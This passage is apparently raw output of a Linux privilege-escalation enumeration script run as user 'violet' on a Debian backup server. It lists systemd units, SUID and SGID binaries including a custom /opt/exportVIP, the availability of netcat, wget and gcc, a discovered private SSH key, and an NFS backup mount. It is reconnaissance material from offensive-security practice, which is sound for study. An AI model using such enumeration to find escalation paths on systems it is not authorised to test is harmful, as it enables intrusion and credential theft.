-rw-r--r-- 1 root root  696 avril  8 12:51 systemd-rfkill.service
-rw-r--r-- 1 root root  617 avril  8 12:51 systemd-rfkill.socket
-rw-r--r-- 1 root root  497 avril  8 12:51 systemd-suspend.service
-rw-r--r-- 1 root root  653 avril  8 12:51 systemd-sysctl.service
-rw-r--r-- 1 root root  868 avril  8 12:51 systemd-timedated.service
-rw-r--r-- 1 root root 1,3K avril  8 12:51 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 avril  8 12:51 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  450 avril  8 12:51 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  703 avril  8 12:51 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 avril  8 12:51 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  595 avril  8 12:51 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 avril  8 12:51 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  968 avril  8 12:51 systemd-udevd.service
-rw-r--r-- 1 root root  823 avril  8 12:51 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 avril  8 12:51 systemd-udev-trigger.service
-rw-r--r-- 1 root root  757 avril  8 12:51 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 avril  8 12:51 systemd-update-utmp.service
-rw-r--r-- 1 root root  588 avril  8 12:51 systemd-user-sessions.service
-rw-r--r-- 1 root root  436 avril  8 12:51 system.slice
-rw-r--r-- 1 root root  585 avril  8 12:51 system-update.target
-rw-r--r-- 1 root root  405 avril  8 12:51 timers.target
-rw-r--r-- 1 root root  395 avril  8 12:51 time-sync.target
lrwxrwxrwx 1 root root   21 avril  8 12:51 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root    9 avril  8 12:51 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 avril  8 12:51 umountroot.service -> /dev/null
-rw-r--r-- 1 root root  417 avril  8 12:51 umount.target
lrwxrwxrwx 1 root root   27 avril  8 12:51 urandom.service -> systemd-random-seed.service
-rw-r--r-- 1 root root  548 avril  8 12:51 user@.service
-rw-r--r-- 1 root root  392 avril  8 12:51 user.slice
lrwxrwxrwx 1 root root    9 avril  8 12:51 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  445 mars   1 17:19 ssh.service
-rw-r--r-- 1 root root  196 mars   1 17:19 ssh@.service
-rw-r--r-- 1 root root  216 mars   1 17:19 ssh.socket
-rw-r--r-- 1 root root  225 janv. 18 11:42 apt-daily.service
-rw-r--r-- 1 root root  156 janv. 18 11:42 apt-daily.timer
-rw-r--r-- 1 root root  238 janv. 18 11:42 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 janv. 18 11:42 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  251 oct.   7  2017 cron.service
lrwxrwxrwx 1 root root   15 mai    5  2017 portmap.service -> rpcbind.service
-rw-r--r-- 1 root root  493 mai    5  2017 rpcbind.service
-rw-r--r-- 1 root root  151 mai    5  2017 rpcbind.socket
-rw-r--r-- 1 root root  319 mars  20  2017 nfs-client.target
lrwxrwxrwx 1 root root    9 mars  20  2017 nfs-common.service -> /dev/null
-rw-r--r-- 1 root root  375 mars  20  2017 nfs-config.service
-rw-r--r-- 1 root root  336 mars  20  2017 nfs-idmapd.service
-rw-r--r-- 1 root root  391 mars  20  2017 rpc-gssd.service
-rw-r--r-- 1 root root  497 mars  20  2017 rpc-statd-notify.service
-rw-r--r-- 1 root root  489 mars  20  2017 rpc-statd.service
-rw-r--r-- 1 root root  515 mars  20  2017 rpc-svcgssd.service
-rw-r--r-- 1 root root  146 mars  20  2017 run-rpc_pipefs.mount
-rw-r--r-- 1 root root  334 mars  17  2017 dm-event.service
-rw-r--r-- 1 root root  248 mars  17  2017 dm-event.socket
-rw-r--r-- 1 root root  345 mars  17  2017 lvm2-lvmetad.service
-rw-r--r-- 1 root root  215 mars  17  2017 lvm2-lvmetad.socket
-rw-r--r-- 1 root root  335 mars  17  2017 lvm2-lvmpolld.service
-rw-r--r-- 1 root root  213 mars  17  2017 lvm2-lvmpolld.socket
-rw-r--r-- 1 root root  658 mars  17  2017 lvm2-monitor.service
-rw-r--r-- 1 root root  403 mars  17  2017 lvm2-pvscan@.service
lrwxrwxrwx 1 root root    9 mars  17  2017 lvm2.service -> /dev/null
-rw-r--r-- 1 root root  290 janv. 18  2017 rsyslog.service
-rw-r--r-- 1 root root  552 janv. 10  2017 ifup@.service
-rw-r--r-- 1 root root  735 oct.  19  2016 networking.service
-rw-r--r-- 1 root root  686 août   3  2016 auth-rpcgss-module.service
-rw-r--r-- 1 root root  567 août   3  2016 nfs-utils.service
-rw-r--r-- 1 root root   98 août   3  2016 proc-fs-nfsd.mount
-rw-r--r-- 1 root root  312 mai   20  2016 console-setup.service
-rw-r--r-- 1 root root  287 mai   19  2016 keyboard-setup.service
-rw-r--r-- 1 root root  188 févr. 24  2014 rsync.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 juin   9 23:42 dbus.service -> ../dbus.service
lrwxrwxrwx 1 root root 15 avril  8 12:51 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 33 avril  8 12:51 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 avril  8 12:51 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 avril  8 12:51 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 avril  8 12:51 systemd-user-sessions.service -> ../systemd-user-sessions.service

/lib/systemd/system/sockets.target.wants:
total 0
lrwxrwxrwx 1 root root 14 juin   9 23:42 dbus.socket -> ../dbus.socket
lrwxrwxrwx 1 root root 25 avril  8 12:51 systemd-initctl.socket -> ../systemd-initctl.socket
lrwxrwxrwx 1 root root 32 avril  8 12:51 systemd-journald-audit.socket -> ../systemd-journald-audit.socket
lrwxrwxrwx 1 root root 34 avril  8 12:51 systemd-journald-dev-log.socket -> ../systemd-journald-dev-log.socket
lrwxrwxrwx 1 root root 26 avril  8 12:51 systemd-journald.socket -> ../systemd-journald.socket
lrwxrwxrwx 1 root root 31 avril  8 12:51 systemd-udevd-control.socket -> ../systemd-udevd-control.socket
lrwxrwxrwx 1 root root 30 avril  8 12:51 systemd-udevd-kernel.socket -> ../systemd-udevd-kernel.socket

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 20 avril  8 12:51 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 avril  8 12:51 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 avril  8 12:51 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 avril  8 12:51 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 36 avril  8 12:51 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 avril  8 12:51 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 avril  8 12:51 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 avril  8 12:51 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 avril  8 12:51 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 avril  8 12:51 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 30 avril  8 12:51 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 27 avril  8 12:51 systemd-journald.service -> ../systemd-journald.service
lrwxrwxrwx 1 root root 32 avril  8 12:51 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 36 avril  8 12:51 systemd-machine-id-commit.service -> ../systemd-machine-id-commit.service
lrwxrwxrwx 1 root root 31 avril  8 12:51 systemd-modules-load.service -> ../systemd-modules-load.service
lrwxrwxrwx 1 root root 30 avril  8 12:51 systemd-random-seed.service -> ../systemd-random-seed.service
lrwxrwxrwx 1 root root 25 avril  8 12:51 systemd-sysctl.service -> ../systemd-sysctl.service
lrwxrwxrwx 1 root root 37 avril  8 12:51 systemd-tmpfiles-setup-dev.service -> ../systemd-tmpfiles-setup-dev.service
lrwxrwxrwx 1 root root 33 avril  8 12:51 systemd-tmpfiles-setup.service -> ../systemd-tmpfiles-setup.service
lrwxrwxrwx 1 root root 24 avril  8 12:51 systemd-udevd.service -> ../systemd-udevd.service
lrwxrwxrwx 1 root root 31 avril  8 12:51 systemd-udev-trigger.service -> ../systemd-udev-trigger.service
lrwxrwxrwx 1 root root 30 avril  8 12:51 systemd-update-utmp.service -> ../systemd-update-utmp.service

/lib/systemd/system/getty.target.wants:
total 0
lrwxrwxrwx 1 root root 23 avril  8 12:51 getty-static.service -> ../getty-static.service

/lib/systemd/system/graphical.target.wants:
total 0
lrwxrwxrwx 1 root root 39 avril  8 12:51 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/local-fs.target.wants:
total 0
lrwxrwxrwx 1 root root 29 avril  8 12:51 systemd-remount-fs.service -> ../systemd-remount-fs.service

/lib/systemd/system/rescue.target.wants:
total 0
lrwxrwxrwx 1 root root 39 avril  8 12:51 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service

/lib/systemd/system/timers.target.wants:
total 0
lrwxrwxrwx 1 root root 31 avril  8 12:51 systemd-tmpfiles-clean.timer -> ../systemd-tmpfiles-clean.timer

/lib/systemd/system/systemd-resolved.service.d:
total 4,0K
-rw-r--r-- 1 root root 551 avril  8 12:51 resolvconf.conf

/lib/systemd/system/systemd-timesyncd.service.d:
total 4,0K
-rw-r--r-- 1 root root 251 avril  8 12:51 disable-with-time-daemon.conf

/lib/systemd/system/rc-local.service.d:
total 4,0K
-rw-r--r-- 1 root root 290 avril  8 12:51 debian.conf

/lib/systemd/system/busnames.target.wants:
total 0

/lib/systemd/system/runlevel1.target.wants:
total 0

/lib/systemd/system/runlevel2.target.wants:
total 0

/lib/systemd/system/runlevel3.target.wants:
total 0

/lib/systemd/system/runlevel4.target.wants:
total 0

/lib/systemd/system/runlevel5.target.wants:
total 0

/lib/systemd/system-sleep:
total 4,0K
-rwxr-xr-x 1 root root 92 mai   15  2018 hdparm

/lib/systemd/system-generators:
total 204K
-rwxr-xr-x 1 root root 23K avril  8 12:51 systemd-cryptsetup-generator
-rwxr-xr-x 1 root root 15K avril  8 12:51 systemd-debug-generator
-rwxr-xr-x 1 root root 31K avril  8 12:51 systemd-fstab-generator
-rwxr-xr-x 1 root root 15K avril  8 12:51 systemd-getty-generator
-rwxr-xr-x 1 root root 35K avril  8 12:51 systemd-gpt-auto-generator
-rwxr-xr-x 1 root root 11K avril  8 12:51 systemd-hibernate-resume-generator
-rwxr-xr-x 1 root root 11K avril  8 12:51 systemd-rc-local-generator
-rwxr-xr-x 1 root root 11K avril  8 12:51 systemd-system-update-generator
-rwxr-xr-x 1 root root 31K avril  8 12:51 systemd-sysv-generator
-rwxr-xr-x 1 root root 11K mars  17  2017 lvm2-activation-generator

/lib/systemd/network:
total 16K
-rw-r--r-- 1 root root 605 avril  8 12:51 80-container-host0.network
-rw-r--r-- 1 root root 678 avril  8 12:51 80-container-ve.network
-rw-r--r-- 1 root root 664 avril  8 12:51 80-container-vz.network
-rw-r--r-- 1 root root  80 avril  8 12:51 99-default.link

/lib/systemd/system-preset:
total 4,0K
-rw-r--r-- 1 root root 923 avril  8 12:51 90-systemd.preset

/lib/systemd/system-shutdown:
total 0


### SOFTWARE #############################################
### INTERESTING FILES ####################################
[-] Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget


[-] Installed compilers:
ii  gcc-6                6.3.0-18+deb9u1 amd64           GNU C compiler


[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1531 juin  27 11:18 /etc/passwd
-rw-r--r-- 1 root root 749 juin  27 11:17 /etc/group
-rw-r--r-- 1 root root 767 mars   4  2016 /etc/profile
-rw-r----- 1 root shadow 1119 juin  24 17:55 /etc/shadow


[-] SUID files:
-rwsr-xr-x 1 root root 10232 mars  28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 440728 mars   1 17:19 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42992 juin   9 23:42 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 59680 mai   17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 50040 mai   17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 75792 mai   17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40504 mai   17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 40312 mai   17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 1019656 mai   28 22:13 /usr/sbin/exim4
-rwsr-xr-x 1 root root 40536 mai   17  2017 /bin/su
-rwsr-xr-x 1 root root 44304 mars   7  2018 /bin/mount
-rwsr-xr-x 1 root root 31720 mars   7  2018 /bin/umount
-rwsr-xr-x 1 root root 61240 nov.  10  2016 /bin/ping
-rwsr-s---+ 1 root root 14392 juil.  8 11:03 /opt/exportVIP
-rwsr-xr-x 1 root root 110760 mars  20  2017 /sbin/mount.nfs


[-] SGID files:
-rwxr-sr-x 1 root mail 19008 janv. 17  2017 /usr/bin/dotlockfile
-rwxr-sr-x 1 root ssh 358624 mars   1 17:19 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 40264 oct.   7  2017 /usr/bin/crontab
-rwxr-sr-x 1 root tty 27448 mars   7  2018 /usr/bin/wall
-rwxr-sr-x 1 root shadow 71856 mai   17  2017 /usr/bin/chage
-rwxr-sr-x 1 root shadow 22808 mai   17  2017 /usr/bin/expiry
-rwxr-sr-x 1 root tty 14768 avril 12  2017 /usr/bin/bsd-write
-rwxr-sr-x 1 root mail 10952 déc.  25  2016 /usr/bin/dotlock.mailutils
-rwsr-s---+ 1 root root 14392 juil.  8 11:03 /opt/exportVIP
-rwxr-sr-x 1 root shadow 35592 mai   27  2017 /sbin/unix_chkpwd


[+] Private SSH keys found!:
/home/georgina/.ssh/id_rsa_georgina


[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
/dev/mapper/SRV02--BACKUP--vg-root /               ext4    errors=remount-ro 0       1
# /boot was on /dev/sda1 during installation
UUID=d6c7ba2c-9f91-45c3-82c1-0ac0101f5db3 /boot           ext2    defaults        0       2
/dev/mapper/SRV02--BACKUP--vg-swap_1 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
172.16.69.23:/DATA/backup /mnt/backup nfs rw,sync,hard,intr 0 0


[-] Can't search *.conf files as no keyword was entered

[-] Can't search *.php files as no keyword was entered

[-] Can't search *.log files as no keyword was entered

[-] Can't search *.ini files as no keyword was entered

[-] All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 4781 mai   15  2018 /etc/hdparm.conf
-rw-r--r-- 1 root root 973 févr.  1  2017 /etc/mke2fs.conf
-rw-r--r-- 1 root root 25 juin  21 17:06 /etc/resolv.conf
-rw-r--r-- 1 root root 604 juin  26  2016 /etc/deluser.conf
-rw-r--r-- 1 root root 191 avril 12  2017 /etc/libaudit.conf
-rw-r--r-- 1 root root 1889 mai    1  2016 /etc/request-key.conf
-rw-r--r-- 1 root root 1963 janv. 18  2017 /etc/rsyslog.conf
-rw-r--r-- 1 root root 1260 mars  16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 3173 juil.  4  2018 /etc/reportbug.conf
-rw-r--r-- 1 root root 497 févr.  6 22:17 /etc/nsswitch.conf
-rw-r--r-- 1 root root 206 déc.  15  2016 /etc/idmapd.conf
-rw-r--r-- 1 root root 599 mai    6  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 2683 mai   17  2018 /etc/sysctl.conf
-rw-r--r-- 1 root root 2584 août   2  2016 /etc/gai.conf
-rw-r--r-- 1 root root 6790 juin  21 17:16 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 144 juin  21 17:22 /etc/kernel-img.conf
-rw-r--r-- 1 root root 34 mars   2  2018 /etc/ld.so.conf
-rw-r--r-- 1 root root 552 mai   27  2017 /etc/pam.conf
-rw-r--r-- 1 root root 2969 mai   21  2017 /etc/debconf.conf
-rw-r--r-- 1 root root 9 août   7  2006 /etc/host.conf
-rw-r--r-- 1 root root 2981 juin  21 17:04 /etc/adduser.conf
-rw-r--r-- 1 root root 346 févr. 26  2018 /etc/discover-modprobe.conf
-rw-r--r-- 1 root root 5804 juil.  4 11:04 /etc/lshell.conf


[-] Current user's history files:
-rw------- 1 violet violet 0 juin  27 11:38 /home/violet/.bash_history


[-] Location and contents (if accessible) of .bash_history file(s):
/home/violet/.bash_history
/home/georgina/.bash_history


[-] Any interesting mail in /var/mail:
total 12
drwxrwsr-x  2 root   mail 4096 juin  27 10:42 .
drwxr-xr-x 11 root   root 4096 juin  21 17:02 ..
-rw-rw----  1 violet mail 2084 juin  27 10:42 violet
```